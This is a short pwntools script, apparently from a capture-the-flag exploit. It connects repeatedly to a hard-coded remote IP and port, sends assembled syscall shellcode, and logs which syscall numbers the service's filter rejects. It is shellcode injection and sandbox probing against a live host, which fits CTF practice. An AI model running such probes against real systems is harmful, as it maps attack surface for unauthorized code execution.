from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

go = lambda x: r.sendlineafter(')\n', str(x))
ii = lambda x: r.sendlineafter(': ', str(x))

f = open('sdump', 'w+')
for i in range(0,0xff):
    r = remote('138.68.67.161', 20001)

    p = asm('mov al, %d' % i)
    p += asm('syscall')
    p += '\x00'

    go('Y\x00'+str(p))

    if 'Bad' in r.recvline():
        f.write('%d %s\n' % (i, 'bad'))
    else:
        f.write('%d %s\n' % (i, 'ok'))

    r.close()
